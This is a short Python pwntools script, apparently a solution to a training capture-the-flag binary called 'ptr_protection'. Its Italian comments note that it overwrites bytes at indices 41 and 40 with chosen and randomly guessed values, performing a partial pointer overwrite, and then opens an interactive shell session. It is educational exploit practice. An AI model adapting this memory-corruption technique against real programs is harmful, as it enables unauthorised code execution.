from pwn import *
import time
import random
context.update(arch='amd64', os='linux')
context.terminal = ['tmux', 'splitw', '-h']

if "REMOTE" not in args:
    p = process("./ptr_protection")
    gdb.attach(p, """
        #b* 0x00101489
        c
        """)
    input("wait")
else:
    p = remote("bin.training.offdef.it", 4202)


index=b"41"          #index 41 sovrascrivo 11
p.sendline(index)
time.sleep(0.1)

random_value = random.randint(0, 255)
print(random_value)
random_value_str = str(random_value)
# Invia random_value come stringa
p.sendline(random_value_str)
time.sleep(0.1)


index=b"40"           #index 40 sovrascrivo e8
p.sendline(index)
time.sleep(0.1)

data=b"232"
p.sendline(data)

time.sleep(0.1)

index=b"-1"
p.sendline(index)

time.sleep(0.1)


p.interactive()

